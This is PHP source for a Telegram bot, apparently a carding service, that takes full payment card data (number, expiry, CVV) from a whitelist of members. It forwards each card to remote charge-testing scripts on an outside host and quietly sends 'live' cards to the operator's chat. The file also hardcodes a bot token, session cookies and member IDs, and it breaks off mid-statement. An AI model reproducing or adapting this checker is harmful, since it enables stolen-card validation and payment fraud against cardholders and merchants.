<?php
$BOT_TOKEN = "1878270846:AAG8V0gX2CiXyiQv5pWmWXtifYbgfJlDPRA";
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

include '2x.php';
#--------------------# IMPORTANT DONT DELETE
$update = file_get_contents('php://input');
$update = json_decode($update, true);
$userChatId = $update["message"]["from"]["id"]?$update["message"]["from"]["id"]:null;
$userMessages = $update["message"]["text"]?$update["message"]["text"]:"Nothing";
$messageId = $update["message"]["message_id"]?$update["message"]["message_id"]:null;
$typeq = $update["message"]["chat"]["type"]?$update["message"]["chat"]["type"]:null;
$superchatId = $update["message"]["chat"]["id"]?$update["message"]["chat"]["id"]:null;
$isbot = $update["message"]["from"]["is_bot"];
$isbotfor = $update["message"]["forward_from"]["is_bot"];
$forwards = $update["message"]["forward_from"];
$del = $update['message']['reply_to_message']['message_id'];
$dela = $update['message']['text'];
$hex = rand(1,2);
$mesx = ($messageId + $hex);
$separadores = array(",",":","'"," ","~","»");
$explode = multiexplode($separadores,$userMessages);
$comand = $explode[0];
$ccx = $explode[1];
$killua = '1223422881';
$topaul = '985989275';
$counting = 'true'; //turn on counting on apchk
$countings = 'true';//turn on counting on apchg
$path = "infos.txt";
#--------------------# IMPORTANT DONT DELETE


if($typeq == "private"){
if($isbot == 'true' or $isbotfor == 'true' or $forwards != null){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "*Please remember that bots and forwarded messages are not allowed in this bot.* \nif you do this again, you'll be *BANNED*.",
        "parse_mode" => "Markdown"
    );
    send("sendMessage", $parameters);
    
        $firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
        $usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
        $parameters = array(
        "chat_id" => $topaul,
        "text" => "*This user*: `".$firstName."` with *ID*: `".$userChatId."` and *username*: `".$usernames."` has been caught using forwarding/bot.",
        "parse_mode" => "Markdown"
    );
    send("sendMessage", $parameters);
}
else{
if($userMessages == '/start'){
    $firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
    $replyMsg = "Hello ".$firstName."\nWelcome to AsianProZbot. \n*Before you start, I would like to tell you that you need to read the description before doing anything.* \n Here is your ID: ".$userChatId."\n*Please give this to @Pauuuulz activate your identity*";


    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $replyMsg,
        "parse_mode" => "Markdown"
    );  

    send("sendMessage", $parameters);
}
else if($comand == '/logs'){
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Current version: `v2.0`\nUPDATE: \n- *OTP CHECKER(AVAILABLE FOR EVERYONE)*\n- *BIN CHECKER 100% ONLINE*\n- *ADDRESS GENERATOR PH 100% ONLINE*\n- *-delete FUNCTION TO DELETE MESSAGE(JUST REPLY TO MESSAGE YOU WANT TO DELETE.*\n- *new UPGRADED TO FASTER SERVER*\n Thank you for your support <3",
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else if($comand == '@free'){

    if($userChatId == 'redeemed'){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*You've already redeemed your free 10 checks today.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );

        send("sendMessage", $parameters);
        exit;
    }
    else if($userChatId == 'not yet'){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*Please add your mobile number example * `@auth 9994810351` *after this message.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );
        send("sendMessage", $parameters);
    }
}
else if($comand == '@auth'){
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => "*Please wait while we verify your data . . .*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    if (!is_numeric($ccx)){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*You've entered a wrong number please try again.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );

        send("sendMessage", $parameters);
        exit;
    }
    $ss = strlen($ccx);
    if($ss != '9'){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*I only accept * `@auth 9994813042` *Please try again.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );

        send("sendMessage", $parameters);
        exit;
    }
    if($titengmalaki == 'redeemed'){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*You've already redeemed your free 10 checks today.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );

        send("sendMessage", $parameters);
        exit;
    }
    
    else if($pukengmataba == 'not yet'){
        $parameters = array(
            "chat_id" => $userChatId,
            "text" => "*Please add your mobile number example * `@auth 9994810351` *after this message.*",
            "reply_to_message_id" => $messageId,
            "parse_mode" => "Markdown"
        );
        send("sendMessage", $parameters);
    }
}
else if($comand == '/status'){
    $curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'http://tempo.ngrok.io/qq.php');
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
    $info = getStr($page, '<pre>','</pre>');
    $online = "Current version: `v4.0`\n\nSTATUS: \n\n- OTP CHECKER *(✔ ONLINE)*\n- BIN CHECKER *(✔ ONLINE)*\n- ADDRESS GENERATOR *(✔ ONLINE)*\n- BOT CHECKER *(✔ ONLINE)*\n- CHARGED CHECKER *(✔ ONLINE)*\n-                         -                        -           \n`SERVER PING` \n-                         -                        -          \n *".$info."*";
$offline = "Current version: `v4.0`\n\nSTATUS: \n- `OTP CHECKER` *(✖ OFFLINE)*\n- `BIN CHECKER` *(✖ OFFLINE)*\n- `ADDRESS GENERATOR` *(✖ OFFLINE)*\n- `BOT CHECKER` *(✖ OFFLINE)*\n- `CHARGED CHECKER` *(✖ OFFLINE)*\n-                         -                        -           \n`SERVER PING` \n-                         -                        -          \n *".$info."*";
    
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $online,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
#><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><#PRIVATE
#---------------------------------------------------------------------------------------------------------------------------------#CC CHECK
else if($comand == '@apchk'){
$x=array("esp","985989275");
$test = array_search($userChatId,$a);
#CHECK IF USER IS ALREADY USED UP HIS CREDITS#
if($test != null){
    $mi = substr_count(file_get_contents($path), $userChatId);
if($mi < '10'){
if($userChatId == '985989275' or $userChatId == '1223422881'){
    $count = '∞';
}
else{
$count = '10' - $mi;
}
$infol = "*You only have* `$count` *checks left for today \n      Please wait . . . . .*";
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
$ss = strlen($ccx);
    if($ss != '28'){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Please remember that I only accept \n`@apchk 4xxxxxxxxxxxxxxx|xx|xxxx|xxx`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];
$amt = $explode[4];
if (is_numeric($cc)){
echo $x1 = 'Valid';
}
else{
echo $x1 = '*Invalid*';
}
if (is_numeric($mm)){
echo $x2 = 'Valid';
}
else{
echo $x2 = '*Invalid*';
}
if (is_numeric($yy)){
echo $x3 = 'Valid';
}
else{
echo $x3 = '*Invalid*';
}
if (is_numeric($cvv)){
echo $x4 = 'Valid';
}
else{
echo $x4 = '*Invalid*';
}

if($x1 == 'Valid'&&$x2 == 'Valid'&&$x3 == 'Valid'&&$x4 == 'Valid'){
    global $ccx;
   #------------------------------------------------------# FOR EXTRAPING

    #------------------------------------------------------# FOR EXTRAPING
    #------------------------------------------------------# FOR CC TYPES

    #------------------------------------------------------# FOR CC TYPES
#----------------------------------------------------------------# BINCODES

#----------------------------------------------------------------# BINCODES
#----------------------------------------------------------------# MAIN CHECKER
    if($mesx%2==0){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";

 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Captured Charged ') or strpos($page, 'Insufficient funds')){
    $parameters = array(
    "chat_id" => 985989275,
    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Captured Charged ')){
    $parameters = array(
    "chat_id" => 985989275,
    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}

}
#----------------------------------------------------------------# MAIN CHECKER

#----------------------------------------------------------------# ERROR HANDLING

#----------------------------------------------------------------# ERROR HANDLING
#----------------------------------------------------------------# ERROR CODES
#----------------------------------------------------------------# ERROR CODES
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
    else{
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Sorry, You must put right number before you continue. \nCredit card number: ".$x1."\nMonth: ".$x2."\nYear: ".$x3."\nCvv: ".$x4,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    }
}
    else{
$infol = '*You already check* `10` *cards for today.*';
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
}  
    else{
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => "*Sorry there are only few members allowed to use this checker.*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
#---------------------------------------------------------------------------------------------------------------------------------#CC CHECK
    ###### USERS #######
#1   #ASIANPRO = 985989275
#2   #POSTOFFICE = 1243839483
#3   #BLAIRE = 944888214
#4   #ANON = 894982402
#5   #BEGGY = 602325087
#6   #KILLUA = 1223422881
#7   #EONARA = 780001502
#8   #GANKED = 665838060
#9   #gel = 1201405822
#10  #HIZE = 1074423732
#11  #sad = 906605094
#12  #SERE = 703645222
#13  #DANGERED = 700368640
#14  #BATO = 803671856
#15  #multo = 657013475
#16  #malwarebytes = 652424054
#17  #:( = 675193262
#18  #SACHIE = 794702128
#19  #goku = 983433654
#20  #DARNA = 1141556881
#21  #KILLER = 698612166
#22  #ANONSHI = 684391358
#23  #HANNAH = 450811383
#24  #hanabi = 954265187
#25  #yuno = 1372886324
#26  #shelby = 1052381766
#27  #eros = 1114886739
#28  #Ate vane = 979801896
#29  #Zoldyk = 628734491
#30  #mantou = 764345029
#31  #blink = 893420604
#32  #realace = 776213149
#LLYODI = 778269663
#nega = 745975958
#BH = 726052416
####################
    #---------------------------------------------------------------------------------------------------------------------------------#CC CC LOAD SMART
else if($comand == '@load'){
$x=array("esp","985989275","1223422881","450811383","979801896","776213149","1074423732","703645222","906605094","780001502","652424054","983433654","944888214","628734491","665838060","803671856","894982402","620980074","1243839483");
$test = array_search($userChatId,$x);
#CHECK IF USER IS ALREADY USED UP HIS CREDITS#
if($test != null){
    $mi = substr_count(file_get_contents($path), $userChatId);
if($mi < '10'){
$count = '10' - $mi;
$infol = "*You only have* `$count` *checks left for today \n      Please wait . . . . .*";
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    $ss = strlen($ccx);
    if($ss >= '28' && $ss <= '41'){
    $xds = 'false';
    }
    if(!$xds){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Please remember that I only accept \n`@apchg 4xxxxxxxxxxxxxxx|xx|xxxx|xxx|amount or leave blank`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];
$amt = $explode[4];
if (is_numeric($cc)){
echo $x1 = 'Valid';
}
else{
echo $x1 = '*Invalid*';
}
if (is_numeric($mm)){
echo $x2 = 'Valid';
}
else{
echo $x2 = '*Invalid*';
}
if (is_numeric($yy)){
echo $x3 = 'Valid';
}
else{
echo $x3 = '*Invalid*';
}
if (is_numeric($cvv)){
echo $x4 = 'Valid';
}
else{
echo $x4 = '*Invalid*';
}

if($x1 == 'Valid'&&$x2 == 'Valid'&&$x3 == 'Valid'&&$x4 == 'Valid'){
    global $ccx;
   #------------------------------------------------------# FOR EXTRAPING

    #------------------------------------------------------# FOR EXTRAPING
    #------------------------------------------------------# FOR CC TYPES

    #------------------------------------------------------# FOR CC TYPES
#----------------------------------------------------------------# BINCODES

#----------------------------------------------------------------# BINCODES
#----------------------------------------------------------------# MAIN CHECKER
    if($mesx%2==0){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/smart.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
if(!$countings){
 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        }
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Approved Charged ') or strpos($page, 'Mobile number is invalid')){
    $parameters = array(
    "chat_id" => 985989275,
    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/smart.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
    if($counting){
 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        }
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Approved Charged ') or strpos($page, 'Mobile number is invalid')){
    $parameters = array(
    "chat_id" => 985989275,
    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}

}
#----------------------------------------------------------------# MAIN CHECKER

#----------------------------------------------------------------# ERROR HANDLING

#----------------------------------------------------------------# ERROR HANDLING
#----------------------------------------------------------------# ERROR CODES
#----------------------------------------------------------------# ERROR CODES
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
    else{
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Sorry, You must put right number before you continue. \nCredit card number: ".$x1."\nMonth: ".$x2."\nYear: ".$x3."\nCvv: ".$x4,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    }
}
    else{
$infol = '*You already check* `10` *cards for today.*';
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
}  
    else{
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => "*Sorry there are only few members allowed to use this checker.*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
#---------------------------------------------------------------------------------------------------------------------------------#CC LOAD SMART
#---------------------------------------------------------------------------------------------------------------------------------#CC CHARGED CHECK
else if($comand == '@apchg'){
$x=array("esp","985989275");
$test = array_search($userChatId,$a);
#CHECK IF USER IS ALREADY USED UP HIS CREDITS#
if($test != null){
$mi = substr_count(file_get_contents($path), $userChatId);
if($mi < '10'){
$count = '10' - $mi;
$infol = "*You only have* `$count` *checks left for today \n      Please wait . . . . .*";
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    $ss = strlen($ccx);
    if($ss >= '28' && $ss <= '32'){
    $xds = 'false';
    }
    if(!$xds){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Please remember that I only accept \n`@apchg 4xxxxxxxxxxxxxxx|xx|xxxx|xxx|amount or leave blank`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];
$amt = $explode[4];
if (is_numeric($cc)){
echo $x1 = 'Valid';
}
else{
echo $x1 = '*Invalid*';
}
if (is_numeric($mm)){
echo $x2 = 'Valid';
}
else{
echo $x2 = '*Invalid*';
}
if (is_numeric($yy)){
echo $x3 = 'Valid';
}
else{
echo $x3 = '*Invalid*';
}
if (is_numeric($cvv)){
echo $x4 = 'Valid';
}
else{
echo $x4 = '*Invalid*';
}

if($x1 == 'Valid'&&$x2 == 'Valid'&&$x3 == 'Valid'&&$x4 == 'Valid'){
    global $ccx;
   #------------------------------------------------------# FOR EXTRAPING

    #------------------------------------------------------# FOR EXTRAPING
    #------------------------------------------------------# FOR CC TYPES

    #------------------------------------------------------# FOR CC TYPES
#----------------------------------------------------------------# BINCODES

#----------------------------------------------------------------# BINCODES
#----------------------------------------------------------------# MAIN CHECKER
    if($mesx%2==0){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telechg.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
if(!$countings){
 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        }
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Approved Charged ') or strpos($page, 'Insufficient funds')){
    $parameters = array(
    "chat_id" => 985989275,
    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telechg.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
$firstName = $update["message"]["from"]["first_name"]?$update["message"]["from"]["first_name"]:"N/A";
$usernames = $update["message"]["from"]["username"]?$update["message"]["from"]["username"]:"N/A";
    if($counting){
 if($userChatId != $topaul && $userChatId != $killua){
 fwrite(fopen("infos.txt", "a"), $userChatId."\n");
         }
        }
if($userChatId != $topaul){
    if(strpos($page, 'Verified Charged ') or strpos($page, 'Approved Charged ')){
    $parameters = array(
    "chat_id" => 985989275,
